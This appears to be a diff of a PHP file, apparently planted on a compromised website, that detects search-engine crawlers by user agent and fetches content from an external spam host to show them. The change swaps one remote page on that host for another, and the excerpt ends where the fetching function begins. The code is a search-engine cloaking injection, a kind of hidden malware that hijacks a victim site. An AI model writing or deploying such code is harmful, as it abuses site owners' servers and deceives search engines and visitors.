@@ -1,7 +1,7 @@
 <?php
 ob_start();
 header('Vary: User-Agent');
-$bot_url = "https://obeydasupreme.site/badboys/tirtapustaka.html";
+$bot_url = "https://obeydasupreme.site/badboys/globaljste.html";
 $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 function lph_requests($url) {
